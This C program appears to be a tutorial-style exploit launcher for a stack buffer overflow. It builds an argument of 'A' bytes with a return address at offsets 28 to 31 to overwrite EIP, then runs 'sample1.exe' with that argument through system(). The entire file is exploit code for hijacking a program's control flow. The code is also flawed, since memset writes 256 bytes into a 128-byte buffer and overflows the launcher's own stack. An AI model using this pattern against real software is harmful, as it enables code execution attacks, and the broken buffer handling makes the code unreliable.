#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
  char command[256];
  char parameter[128];
  
 memset(parameter,0x41,256); // fill the parameter with 'A' character
  
  // now modify the location which overwrites the EIP
  
  parameter[28]= 0xaf;
  parameter[29]= 0x12;
  parameter[30]= 0x40;
  parameter[31]= 0x00;

  parameter[32] = 0 ;  /* null terminate the parameter so as previous frames are not overwritten */
  
  strcpy(command , "sample1.exe ");
  strcat(command, parameter);
  
  printf("%s\n",command);
  
  system(command);	/* execute the command */
  return 0;
}
